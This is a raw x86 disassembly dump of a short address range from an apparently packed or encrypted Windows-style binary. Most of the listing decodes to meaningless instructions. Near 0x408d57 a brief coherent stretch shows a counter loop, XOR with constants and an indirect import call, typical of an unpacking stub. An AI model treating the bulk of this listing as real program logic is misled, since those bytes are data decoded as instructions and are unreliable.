  40884a:	or     edx,DWORD PTR ds:0xc82c412c
  408850:	sti    
  408851:	or     DWORD PTR [eax-0x6e],ecx
  408854:	lahf   
  408855:	jb     0x4088ab
  408857:	cmp    BYTE PTR [eax+edi*4],al
  40885a:	jge    0x40880d
  40885c:	bound  ecx,QWORD PTR [ebx+0x5f]
  40885f:	dec    ebp
  408860:	cmp    bh,bh
  408862:	push   ss
  408863:	scas   al,BYTE PTR es:[edi]
  408864:	test   edi,edi
  408866:	daa    
  408867:	pop    esp
  408868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408869:	(bad)  
  40886a:	jae    0x4088db
  40886c:	sbb    DWORD PTR [ebp+0x43],edi
  40886f:	jle    0x408893
  408871:	push   ss
  408872:	gs jns 0x40889d
  408875:	aaa    
  408876:	cmp    cl,bl
  408878:	enter  0x79e8,0xea
  40887c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40887d:	cmp    al,0x72
  40887f:	jno    0x408846
  408881:	mov    bl,0x7f
  408883:	inc    edi
  408884:	dec    edx
  408885:	stos   BYTE PTR es:[edi],al
  408886:	cmp    al,bl
  408888:	aad    0x92
  40888a:	xchg   ebx,eax
  40888b:	scas   eax,DWORD PTR es:[edi]
  40888c:	sub    edx,esp
  40888e:	aaa    
  40888f:	mov    DWORD PTR cs:[ebx-0x49239d7a],esp
  408896:	push   esp
  408897:	cmp    esp,DWORD PTR [edi*2+0x5ab00969]
  40889e:	fisub  WORD PTR [edi-0x68]
  4088a1:	jecxz  0x4088ff
  4088a3:	jmp    0x408905
  4088a5:	fcomp  DWORD PTR [eax+0x1250de4d]
  4088ab:	call   0xbd6f:0x870a5a34
  4088b2:	dec    edi
  4088b3:	mov    cl,0x44
  4088b5:	lea    eax,[esi]
  4088b7:	or     ah,al
  4088b9:	mov    dh,0x48
  4088bb:	xchg   ebx,ebp
  4088bd:	and    eax,0x922e8b20
  4088c2:	pop    es
  4088c3:	fs jge 0x4088f7
  4088c6:	aad    0x34
  4088c8:	es jb  0x408883
  4088cb:	loop   0x40885b
  4088cd:	xchg   ecx,eax
  4088ce:	cli    
  4088cf:	inc    esi
  4088d0:	in     al,dx
  4088d1:	xlat   BYTE PTR ds:[ebx]
  4088d2:	and    DWORD PTR [esi-0x6f],ecx
  4088d5:	in     eax,0xe4
  4088d7:	xor    dh,BYTE PTR ds:[ecx-0x5ebdbd5a]
  4088de:	mov    edi,0x69e38a42
  4088e3:	xor    edi,esi
  4088e5:	add    bl,bl
  4088e7:	push   cs
  4088e8:	stc    
  4088e9:	(bad)  
  4088ea:	hlt    
  4088eb:	pop    esp
  4088ec:	js     0x40894a
  4088ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088ef:	cmc    
  4088f0:	mov    ds:0x746835e4,eax
  4088f5:	cwde   
  4088f6:	mov    ch,BYTE PTR [ecx+0x1d7ba87]
  4088fc:	sti    
  4088fd:	or     eax,0x2e0a8a00
  408902:	cmp    cl,BYTE PTR [esi]
  408904:	add    al,0x1a
  408906:	aas    
  408907:	adc    bl,bh
  408909:	xchg   edi,eax
  40890a:	mov    al,BYTE PTR [esi+eax*2-0x3d]
  40890e:	sti    
  40890f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408910:	fcomp  QWORD PTR [ebp+0x20]
  408913:	adc    BYTE PTR [esi+0x1b],cl
  408916:	loop   0x4088c6
  408918:	(bad)  
  408919:	xor    al,0x2a
  40891b:	imul   esi,DWORD PTR [esp],0x976141e8
  408922:	xchg   edi,eax
  408923:	repz leave 
  408925:	stc    
  408926:	jne    0x4088e2
  408928:	ja     0x4088fc
  40892a:	gs inc ecx
  40892c:	std    
  40892d:	or     eax,0xc72edcf9
  408932:	add    eax,0x27b73596
  408937:	call   0x6945a4bf
  40893c:	out    0x53,eax
  40893e:	sbb    al,0x25
  408940:	adc    dl,BYTE PTR [edx-0x5c]
  408943:	xchg   BYTE PTR [ecx+0x5e18493],dh
  408949:	sub    al,0x6f
  40894b:	psllw  mm6,QWORD PTR [edx]
  40894e:	xlat   BYTE PTR ds:[ebx]
  40894f:	loope  0x4088e6
  408951:	adc    ebx,ebx
  408953:	or     BYTE PTR [edx-0x3c],dh
  408956:	inc    esi
  408957:	mov    ah,0xa9
  408959:	jnp    0x408961
  40895b:	and    ah,BYTE PTR ds:0x79a97d19
  408961:	retf   
  408962:	out    dx,al
  408963:	adc    cl,cl
  408965:	xchg   ebx,eax
  408966:	jae    0x4089ac
  408968:	xchg   DWORD PTR [esi-0x66],ecx
  40896b:	lea    edx,ds:0x511b05c3
  408971:	xor    ch,BYTE PTR ds:0x11f06284
  408977:	dec    edi
  408978:	xchg   esp,eax
  408979:	pop    es
  40897a:	jne    0x40892a
  40897c:	shr    DWORD PTR [esi+0x7c],1
  40897f:	pop    edx
  408980:	mov    bh,0x15
  408982:	push   esp
  408983:	test   eax,0xa56bcda3
  408988:	xor    ch,ch
  40898a:	fstp   QWORD PTR [ecx]
  40898c:	repz repz cmp DWORD PTR [edi+0x28084206],esi
  408994:	mov    esp,0x7dbe7803
  408999:	inc    eax
  40899a:	jae    0x4089ba
  40899c:	sti    
  40899d:	xchg   esi,eax
  40899e:	sub    al,0x4d
  4089a0:	div    BYTE PTR ds:0x4acb2afd
  4089a6:	aad    0x76
  4089a8:	push   ecx
  4089a9:	test   al,0xf1
  4089ab:	or     eax,0xea8102fc
  4089b0:	jb     0x40898e
  4089b2:	in     eax,dx
  4089b3:	out    dx,eax
  4089b4:	dec    ebp
  4089b5:	fisttp QWORD PTR [esi+0x4730d25]
  4089bb:	cmp    bl,BYTE PTR [ebp-0x61ed1023]
  4089c1:	xchg   edi,eax
  4089c2:	inc    eax
  4089c3:	loopne 0x40897b
  4089c5:	aam    0x62
  4089c7:	inc    edi
  4089c8:	fcom   QWORD PTR [edi+0x26491b9b]
  4089ce:	push   ebp
  4089cf:	sub    bh,BYTE PTR [ebp+0x7949ebc0]
  4089d5:	xor    dl,BYTE PTR [ebp-0xdb07230]
  4089db:	int3   
  4089dc:	mov    dh,0x2c
  4089de:	push   eax
  4089df:	push   ss
  4089e0:	xor    eax,0xa4b2a512
  4089e5:	out    dx,al
  4089e6:	sub    ch,BYTE PTR [esi+0x32a76eba]
  4089ec:	dec    esi
  4089ed:	adc    esi,esp
  4089ef:	stc    
  4089f0:	jecxz  0x408a3d
  4089f2:	(bad)  
  4089f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f4:	rcr    DWORD PTR [ecx-0x66d2c0c5],1
  4089fa:	imul   esp,esp,0x8d115cab
  408a00:	push   es
  408a01:	dec    edi
  408a02:	lock or edi,DWORD PTR [ecx+0x46]
  408a06:	arpl   WORD PTR [eax-0x38],si
  408a09:	xor    eax,0xc1d8a4b1
  408a0e:	jmp    0x408a57
  408a10:	or     al,ah
  408a12:	xchg   ebp,eax
  408a13:	aas    
  408a14:	xchg   edx,eax
  408a15:	pop    es
  408a16:	adc    BYTE PTR [edi-0x27daa97b],dl
  408a1c:	ret    
  408a1d:	cld    
  408a1e:	sbb    edi,DWORD PTR [ecx+eax*2]
  408a21:	cwde   
  408a22:	leave  
  408a23:	or     cl,cl
  408a25:	mov    cl,0x9a
  408a27:	mov    bh,0x5a
  408a29:	in     al,0x1a
  408a2b:	sub    dh,ah
  408a2d:	cli    
  408a2e:	and    ch,BYTE PTR ss:0xaada6382
  408a35:	push   DWORD PTR ds:0x42befc7f
  408a3b:	ins    DWORD PTR es:[edi],dx
  408a3c:	out    0xb7,eax
  408a3e:	mov    eax,0xf3b48021
  408a43:	mov    al,0x1e
  408a45:	gs mov edi,0xe5fafc57
  408a4b:	dec    esp
  408a4c:	gs pushf 
  408a4e:	cmp    al,BYTE PTR [ecx-0x2e]
  408a51:	xchg   ebx,eax
  408a52:	shr    BYTE PTR [esi],cl
  408a54:	and    BYTE PTR [esi+0x54],ah
  408a57:	and    ah,BYTE PTR [ebp-0x71]
  408a5a:	sub    al,0xc9
  408a5c:	cmp    al,dl
  408a5e:	push   ecx
  408a5f:	xor    BYTE PTR [esi+0x7a],0xed
  408a63:	xchg   BYTE PTR [ecx-0x79c1ee55],dl
  408a69:	es nop
  408a6b:	test   eax,0x89f0c465
  408a70:	add    DWORD PTR [esi-0x37],ebx
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0x88b3a4f9
  408a92:	ja     0x408a38
  408a94:	xor    edi,DWORD PTR [eax]
  408a96:	in     al,0x78
  408a98:	js     0x408a41
  408a9a:	jle    0x408b14
  408a9c:	js     0x408a58
  408a9e:	out    dx,al
  408a9f:	xchg   edx,eax
  408aa0:	xlat   BYTE PTR ds:[ebx]
  408aa1:	jge    0x408a74
  408aa3:	jmp    0x6de21f9
  408aa8:	push   ecx
  408aa9:	sub    bh,BYTE PTR [edi+0x760a9508]
  408aaf:	(bad)  
  408ab0:	popa   
  408ab1:	sbb    al,0xc7
  408ab3:	sub    eax,esi
  408ab5:	push   ds
  408ab6:	mov    edi,0x3f420658
  408abb:	jecxz  0x408af7
  408abd:	(bad)  
  408abe:	add    eax,0x631f528b
  408ac3:	cmp    dh,bl
  408ac5:	pop    ecx
  408ac6:	xchg   esi,eax
  408ac7:	jecxz  0x408af5
  408ac9:	(bad)  
  408aca:	call   0x9359c84d
  408acf:	(bad)  [ebx-0x6c10a52d]
  408ad5:	add    DWORD PTR [ebp-0x43],0x7a
  408ad9:	mov    ds:0xbb81f755,al
  408ade:	enter  0x26a3,0x9a
  408ae2:	xor    ch,ah
  408ae4:	jmp    FWORD PTR [ecx+0x61]
  408ae7:	ins    DWORD PTR es:[edi],dx
  408ae8:	push   esi
  408ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aea:	pop    esp
  408aeb:	test   BYTE PTR [eax+edx*1+0x66],0x8e
  408af0:	nop
  408af1:	push   ss
  408af2:	xchg   esi,eax
  408af3:	xchg   esi,eax
  408af4:	sbb    DWORD PTR [edx-0x21e77bfe],eax
  408afa:	data16 stc 
  408afc:	or     edi,DWORD PTR [esi-0x57]
  408aff:	add    eax,DWORD PTR [edx-0xdd283bc]
  408b05:	cmp    al,0x16
  408b07:	jl     0x408af2
  408b09:	hlt    
  408b0a:	icebp  
  408b0b:	outs   dx,BYTE PTR ds:[esi]
  408b0c:	mov    ch,0xf5
  408b0e:	ss sahf 
  408b10:	mov    dh,0x17
  408b12:	or     al,0xb5
  408b14:	test   cl,dh
  408b16:	call   0xebd:0x553a89ec
  408b1d:	fist   DWORD PTR [edx]
  408b1f:	xchg   DWORD PTR [edx-0x36cda0],edx
  408b25:	sbb    eax,0xa8812486
  408b2a:	(bad)  
  408b2b:	clc    
  408b2c:	cmp    BYTE PTR [esi],0x4c
  408b2f:	clc    
  408b30:	stos   DWORD PTR es:[edi],eax
  408b31:	out    dx,eax
  408b32:	std    
  408b33:	jo     0x408ad4
  408b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b36:	ret    0xa020
  408b39:	stos   DWORD PTR es:[edi],eax
  408b3a:	pop    ebp
  408b3b:	bound  ebx,QWORD PTR [esi+0x69]
  408b3e:	mov    bl,0x59
  408b40:	test   ebp,ebp
  408b42:	stos   DWORD PTR es:[edi],eax
  408b43:	test   al,0x26
  408b45:	pop    es
  408b46:	inc    eax
  408b47:	pop    es
  408b48:	test   al,0xb1
  408b4a:	cmp    dl,0x2a
  408b4d:	dec    edi
  408b4e:	xor    BYTE PTR es:[ecx+0x73160161],ch
  408b55:	xchg   edx,eax
  408b56:	push   ecx
  408b57:	imul   esi,DWORD PTR [edx],0x34d24c42
  408b5d:	pushf  
  408b5e:	cmp    BYTE PTR [esi+0x69],cl
  408b61:	(bad)
  408b65:	jne    0x408b24
  408b67:	cmp    BYTE PTR [edi-0x30dd394f],al
  408b6d:	jecxz  0x408b17
  408b6f:	jg     0x408b83
  408b71:	jg     0x408b5a
  408b73:	aad    0x71
  408b75:	adc    ah,BYTE PTR [edi]
  408b77:	inc    edi
  408b78:	in     al,0xf9
  408b7a:	inc    esp
  408b7b:	sbb    dl,BYTE PTR [eax]
  408b7d:	xchg   esi,eax
  408b7e:	test   DWORD PTR [edx],eax
  408b80:	push   ecx
  408b81:	ds jb  0x408b17
  408b84:	xor    edi,DWORD PTR [edx+ecx*4]
  408b87:	push   ebx
  408b88:	rcl    BYTE PTR ds:0x283d9fc1,0x7c
  408b8f:	pop    ebp
  408b90:	mov    esp,0x1ae72c61
  408b95:	int3   
  408b96:	lahf   
  408b97:	daa    
  408b98:	add    eax,0xa120ec04
  408b9d:	lods   al,BYTE PTR ds:[esi]
  408b9e:	scas   eax,DWORD PTR es:[edi]
  408b9f:	(bad)  
  408ba0:	in     al,dx
  408ba1:	in     al,dx
  408ba2:	cmp    edx,DWORD PTR [edx]
  408ba4:	add    eax,0xf82243ec
  408ba9:	test   al,0x53
  408bab:	add    eax,0x4aa35f68
  408bb0:	push   ebx
  408bb2:	lea    eax,[ecx]
  408bb4:	ror    DWORD PTR [ebp+0x16f96ca8],0xd1
  408bbb:	jnp    0x408b97
  408bbd:	inc    esi
  408bbe:	jnp    0x408b74
  408bc0:	adc    esp,DWORD PTR [eax]
  408bc2:	add    bh,BYTE PTR [ebx-0x6b3a17b7]
  408bc8:	inc    ecx
  408bc9:	leave  
  408bca:	sti    
  408bcb:	xchg   DWORD PTR [eax+0x73],ebp
  408bce:	or     bh,BYTE PTR [eax-0x59e8ecb3]
  408bd4:	int3   
  408bd5:	dec    ebp
  408bd6:	ret    0x5c20
  408bd9:	adc    al,0x29
  408bdb:	jbe    0x408c4a
  408bdd:	imul   esi,ebx,0x2c
  408be0:	jae    0x408c4e
  408be2:	xlat   BYTE PTR ds:[ebx]
  408be3:	push   cs
  408be4:	sar    bh,0xa5
  408be7:	xor    DWORD PTR [esi-0x3],0xffffffe2
  408beb:	stos   BYTE PTR es:[edi],al
  408bec:	sub    eax,0xa74ff7f4
  408bf1:	xchg   ebp,eax
  408bf2:	in     al,dx
  408bf3:	fisub  DWORD PTR [eax-0x6e18119a]
  408bf9:	jbe    0x408be9
  408bfb:	push   ss
  408bfc:	adc    eax,DWORD PTR [edx-0x1ed817b]
  408c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c03:	adc    bh,BYTE PTR [esi+0x69f72956]
  408c09:	sub    ebp,DWORD PTR [ebx+0x7a]
  408c0c:	mov    ds:0x8e47a18,eax
  408c11:	cmp    DWORD PTR [esi+ecx*8],edi
  408c14:	and    BYTE PTR [eax],cl
  408c16:	push   cs
  408c17:	mov    ecx,0x9bedabd3
  408c1c:	dec    esp
  408c1d:	sub    bh,ch
  408c1f:	in     al,0xa9
  408c21:	shl    ebp,1
  408c23:	ins    BYTE PTR es:[edi],dx
  408c24:	test   DWORD PTR [eax-0x4fc72822],0x9b6e2696
  408c2e:	mov    dh,0x5d
  408c30:	popf   
  408c31:	pusha  
  408c32:	(bad)  
  408c33:	mov    al,ds:0x1b48a8b4
  408c38:	outs   dx,DWORD PTR ds:[esi]
  408c39:	adc    BYTE PTR [ebx+0x2b],cl
  408c3c:	jo     0x408c40
  408c3e:	rol    DWORD PTR [edi],cl
  408c40:	das    
  408c41:	xchg   ebx,eax
  408c42:	push   ebp
  408c43:	inc    edx
  408c44:	aam    0xf2
  408c46:	push   ds
  408c47:	push   ss
  408c48:	cmp    bh,BYTE PTR [ecx]
  408c4a:	dec    ebx
  408c4b:	lahf   
  408c4c:	jbe    0x408c3e
  408c4e:	xlat   BYTE PTR ds:[ebx]
  408c4f:	enter  0x765c,0xfb
  408c53:	ins    BYTE PTR es:[edi],dx
  408c54:	mov    eax,0x76d0315e
  408c59:	add    eax,0xb2d4fdea
  408c5e:	in     eax,dx
  408c5f:	inc    ecx
  408c60:	cmp    bl,bh
  408c62:	mov    ecx,DWORD PTR [eax+eiz*8-0x992d5be]
  408c69:	imul   esp,DWORD PTR [esp+esi*8-0x2b],0x2e46a00f
  408c71:	jl     0x408cb2
  408c73:	mov    ebp,0x4f3bbacc
  408c78:	mov    ebp,0x19f8686d
  408c7d:	loopne 0x408c59
  408c7f:	mov    ah,ch
  408c81:	sub    al,0x5f
  408c83:	(bad)  
  408c84:	jno    0x408cb7
  408c86:	cmp    eax,DWORD PTR [ebx]
  408c88:	adc    al,BYTE PTR [esi]
  408c8a:	pop    ecx
  408c8b:	xchg   esi,eax
  408c8c:	xor    dh,dh
  408c8e:	mov    ch,0xca
  408c90:	push   ebp
  408c91:	push   ebx
  408c92:	mov    eax,ds:0x20a567ad
  408c97:	cdq    
  408c98:	mov    ds:0x5b5e769a,al
  408c9d:	sti    
  408c9e:	mov    dh,0x4a
  408ca0:	mov    al,bh
  408ca2:	fwait
  408ca3:	nop
  408ca4:	mov    edi,0x5dce1a58
  408ca9:	jecxz  0x408c40
  408cab:	xlat   BYTE PTR ds:[ebx]
  408cac:	dec    ebp
  408cad:	leave  
  408cae:	push   esp
  408caf:	mov    dh,0xc6
  408cb1:	cmp    ebp,ecx
  408cb3:	js     0x408c55
  408cb5:	retf   
  408cb6:	adc    eax,0x72e0fccc
  408cbb:	in     eax,dx
  408cbc:	call   0x2711:0x491d1696
  408cc3:	daa    
  408cc4:	sar    BYTE PTR [edi+ebx*2-0x57],0xe2
  408cc9:	ror    bh,cl
  408ccb:	mov    eax,0x27abc286
  408cd0:	or     BYTE PTR [edi],0xae
  408cd3:	cmc    
  408cd4:	imul   edi,esp,0x4cb946a1
  408cda:	les    edx,FWORD PTR [esi]
  408cdc:	retf   0x84ca
  408cdf:	mov    esp,0xe79b4e54
  408ce4:	pop    eax
  408ce5:	sbb    BYTE PTR [edx+ecx*8+0x59],dh
  408ce9:	sti    
  408cea:	lds    edi,FWORD PTR [ebx]
  408cec:	aas    
  408ced:	int    0x18
  408cef:	arpl   WORD PTR [ebx+0x754c577c],bx
  408cf5:	cmp    al,0x22
  408cf7:	call   0x8a46e3d3
  408cfc:	mov    al,0x66
  408cfe:	scas   eax,DWORD PTR es:[edi]
  408cff:	xor    al,0xf6
  408d02:	add    eax,0x7f808bdb
  408d07:	(bad)  
  408d08:	pop    eax
  408d09:	mov    esp,0x18c1821a
  408d0e:	pop    ebp
  408d0f:	adc    eax,0x2cf98be5
  408d14:	je     0x408cd7
  408d16:	fild   QWORD PTR ds:0x69dc8944
  408d1c:	push   es
  408d1d:	jne    0x408ccc
  408d1f:	push   edi
  408d20:	push   esi
  408d21:	int    0xc1
  408d23:	cmc    
  408d24:	test   DWORD PTR [edx-0x59],eax
  408d27:	mov    ebp,0x7b825a66
  408d2c:	mov    ch,0x10
  408d2e:	fstp   TBYTE PTR [ebx+esi*1]
  408d31:	and    DWORD PTR [edi],ecx
  408d33:	out    0xee,al
  408d35:	out    0x53,eax
  408d37:	xchg   BYTE PTR [ecx-0x2d],cl
  408d3a:	jb     0x408d61
  408d3c:	dec    ecx
  408d3d:	xchg   edx,eax
  408d3e:	xchg   edx,eax
  408d3f:	pop    es
  408d40:	inc    eax
  408d41:	stos   DWORD PTR es:[edi],eax
  408d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d43:	xor    al,0x2e
  408d45:	mov    edi,eax
  408d47:	inc    ebp
  408d48:	clc    
  408d49:	cmp    BYTE PTR [ebp+0x45c7f89c],al
  408d4f:	cld    
  408d50:	cmp    DWORD PTR [ebp+0x458bf89c],eax
  408d56:	cld    
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xffffffe9
  408e1d:	cld    
  408e1e:	in     al,0x7c
  408e20:	addr16 jmp 0x7878:0x7ea77878
  408e28:	cmp    al,0x59
  408e2a:	push   ecx
  408e2b:	gs mov al,0x8d
  408e2e:	leave  
  408e2f:	lds    ebx,FWORD PTR [ebx]
  408e31:	enter  0x8ea8,0xa2
  408e35:	test   ah,dh
  408e37:	mov    ebp,DWORD PTR [ecx+0x18]
  408e3a:	loopne 0x408e4e
  408e3c:	jne    0x408e64
  408e3e:	mov    ds:0x90bdbe8e,al
  408e43:	mov    gs,WORD PTR [edx+0x37]
  408e46:	enter  0xff26,0xe0
  408e4a:	jge    0x408df9
  408e4c:	push   esp
  408e4d:	fld    DWORD PTR [edi]
  408e4f:	xchg   ecx,eax
  408e50:	pop    fs
  408e52:	fisub  DWORD PTR [ecx-0x1]
  408e55:	cmp    dl,BYTE PTR [esi+0x51252645]
  408e5b:	adc    BYTE PTR [eax+0x3f056878],0x15
  408e62:	aas    
  408e63:	push   esp
  408e64:	es mov dh,bh
  408e67:	inc    edi
  408e68:	jmp    0x9e4f9ab2
  408e6d:	into   
  408e6e:	hlt    
  408e6f:	xor    al,0x59
  408e71:	shl    DWORD PTR [edx],1
  408e73:	es or  dl,ch
  408e76:	out    0xb1,eax
  408e78:	std    
  408e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e7a:	cmp    esi,DWORD PTR [esi-0x2f58ad7c]
  408e80:	push   eax
  408e81:	xchg   ebp,eax
  408e82:	ss scas eax,DWORD PTR es:[edi]
  408e84:	and    DWORD PTR [ecx+esi*2],esp
  408e87:	push   esi
  408e88:	jmp    0x6415:0x5c723366
  408e8f:	lahf   
  408e90:	inc    eax
  408e91:	call   0x4b35:0xbaa65cec
  408e98:	jmp    0x408e1d
  408e9a:	mov    esi,gs
  408e9c:	or     al,0xa4
  408e9e:	dec    esp
  408e9f:	xchg   DWORD PTR [edx+0x1af60777],ebx
  408ea5:	adc    al,BYTE PTR [ecx+0x24d0ea96]
  408eab:	sub    al,0xf7
  408ead:	sahf   
  408eae:	(bad)  
  408eaf:	fsubr  QWORD PTR [ecx-0x57]
  408eb2:	xor    dh,BYTE PTR [edx]
  408eb4:	lock icebp 
  408eb6:	dec    ebp
  408eb7:	leave  
  408eb8:	jne    0x408e80
  408eba:	push   0xffffff92
  408ebc:	sbb    eax,0xe02f210d
  408ec1:	pop    es
  408ec2:	jb     0x408e64
  408ec4:	or     eax,0xce498bf9
  408ec9:	mov    ah,0x8e
  408ecb:	test   al,0xf0
  408ecd:	ret    0x7f1
  408ed0:	mov    ebp,0xa92d5f64
  408ed5:	cmp    BYTE PTR [eax],cl
  408ed7:	dec    eax
  408ed8:	add    eax,0x3c721b5a
  408edd:	xor    eax,0x87fe38d5
  408ee2:	scas   eax,DWORD PTR es:[edi]
  408ee3:	rcl    BYTE PTR [eax-0x436e8d74],1
  408ee9:	mov    edx,edi
  408eeb:	xor    bl,ch
  408eed:	xor    DWORD PTR [esp+ecx*8],0xe7754788
  408ef4:	mov    cl,BYTE PTR [esi+0x6]
  408ef7:	xor    cl,BYTE PTR [eax+0x72]
  408efa:	cmp    cl,BYTE PTR [edi+0x4248d002]
  408f00:	push   es
  408f01:	enter  0x3506,0xc8
  408f05:	cmp    eax,0xcef9931d
  408f0a:	push   esi
  408f0b:	dec    ebx
  408f0c:	in     eax,0x4c
  408f0e:	mov    BYTE PTR [ebx],ch
  408f10:	push   edx
  408f11:	push   ecx
  408f12:	pop    ebp
  408f13:	adc    DWORD PTR [edx],0x49bd7d52
  408f19:	aam    0x4a
  408f1b:	add    DWORD PTR [edx+0x7bebb610],esi
  408f21:	xchg   DWORD PTR [eax],ecx
  408f23:	dec    esi
  408f24:	leave  
  408f25:	leave  
  408f26:	fld    QWORD PTR [ebx-0x19]
  408f29:	ffree  st(0)
  408f2b:	sbb    BYTE PTR [edx],cl
  408f2d:	shl    BYTE PTR [edx-0x31669504],0x64
  408f34:	cmp    esp,DWORD PTR [ebp-0x67]
  408f37:	cmp    eax,0xae415501
  408f3c:	out    0x52,al
  408f3e:	ss push ebp
  408f40:	aam    0x3c
  408f42:	xor    al,0x60
  408f44:	mov    ch,0xb5
  408f46:	cld    
  408f47:	ss sahf 
  408f49:	cmp    bh,bh
  408f4b:	xchg   ebx,eax
  408f4c:	jno    0x408f0e
  408f4e:	std    
  408f4f:	jmp    0x662:0x979274a5
  408f56:	inc    ebp
  408f57:	inc    esi
  408f58:	fcom   DWORD PTR [eax+ebx*2]
  408f5b:	xchg   DWORD PTR [ecx],ecx
  408f5d:	pop    ds
  408f5e:	push   cs
  408f5f:	push   eax
  408f60:	mov    ah,ah
  408f62:	mov    ds:0xc4434ca0,al
  408f67:	fcom   QWORD PTR [edi]
  408f69:	call   0xe5:0xfe5d42b6
  408f70:	out    0x43,al
  408f72:	sahf   
  408f73:	invd   
  408f75:	xor    DWORD PTR [ebx],0x99904fd5
  408f7b:	and    BYTE PTR [ecx],0xb4
  408f7e:	xor    BYTE PTR [ecx-0x3430576c],al
  408f84:	lock jge 0x408f09
  408f87:	shl    DWORD PTR [edi+edi*4],1
  408f8a:	and    eax,ebp
  408f8c:	in     al,0xdc
  408f8e:	mov    esp,0xaed1e744
  408f93:	and    DWORD PTR [eax-0x78bbd5f7],ebp
  408f99:	sbb    eax,DWORD PTR [esi-0x76da57fc]
  408f9f:	mul    DWORD PTR [edi-0x7c]
  408fa2:	call   0x87959b3f
  408fa7:	and    dl,al
  408fa9:	dec    ebx
  408faa:	repnz push cs
  408fac:	fsqrt  
  408fae:	mov    edx,0xe389ee5
  408fb3:	push   ebp
  408fb4:	pop    eax
  408fb5:	fwait
  408fb6:	ins    BYTE PTR es:[edi],dx
  408fb7:	add    al,0x2a
  408fb9:	outs   dx,BYTE PTR ds:[esi]
  408fba:	add    DWORD PTR [ebp-0xe],ebx
  408fbd:	xor    esi,DWORD PTR [esp+ebx*4+0x6a]
  408fc1:	inc    edi
  408fc2:	xor    eax,0xcaeb2ae0
  408fc7:	add    eax,0x938d5ecb
  408fcc:	test   DWORD PTR [edx+0x64de2c3e],0x3c5bd4f5
  408fd6:	mov    al,0x6d
  408fd8:	add    BYTE PTR [ebx+0x51b90a37],al
  408fde:	ss and eax,0xdeb39bf
  408fe4:	mov    ds:0x370530b6,al
  408fe9:	rcr    DWORD PTR [ebp-0x52],0x8c
  408fed:	pop    esi
  408fee:	xor    al,0xd9
  408ff0:	fs pusha 
  408ff2:	dec    edx
  408ff3:	xchg   ecx,eax
  408ff4:	outs   dx,DWORD PTR ds:[esi]
  408ff5:	push   esp
  408ff6:	mov    esi,DWORD PTR [ecx]
  408ff8:	jnp    0x408fac
  408ffa:	cwde   
  408ffb:	ffreep st(0)
  408ffd:	ficom  DWORD PTR [ebx-0x32]
  409000:	add    al,dh
  409002:	mov    dl,0x17
  409004:	jge    0x408fcd
  409006:	pop    ds
  409007:	sbb    BYTE PTR [esi-0x4dbf00be],bl
  40900d:	jp     0x408fd8
  40900f:	ins    DWORD PTR es:[edi],dx
  409010:	push   0x98fda08d
  409015:	comiss xmm5,DWORD PTR ss:[edx-0x3062ba80]
  40901d:	sbb    dh,BYTE PTR [edx]
  40901f:	test   DWORD PTR [ebp+ebx*4-0x18f3a13c],ebx
  409026:	cdq    
  409027:	xchg   ebx,eax
  409028:	shl    DWORD PTR gs:[edi-0x8fb1635],1
  40902f:	and    edx,DWORD PTR [ecx+0x24]
  409032:	pusha  
  409033:	cs loopne 0x408ff3
  409036:	out    dx,al
  409037:	ror    BYTE PTR [ebp+eiz*8+0x7af630af],1
  40903e:	inc    ecx
  40903f:	inc    eax
  409040:	jl     0x408fce
  409042:	sti    
  409043:	add    bh,ah
  409045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409046:	inc    BYTE PTR [edx+0x312bb2c]
  40904c:	cwde   
  40904d:	and    DWORD PTR [edx-0x79],0xabb32df7
  409054:	jg     0xced310ad
  40905a:	cwde   
  40905b:	or     ch,ch
  40905d:	inc    eax
  40905e:	mov    DWORD PTR [ebp-0x2b],ebx
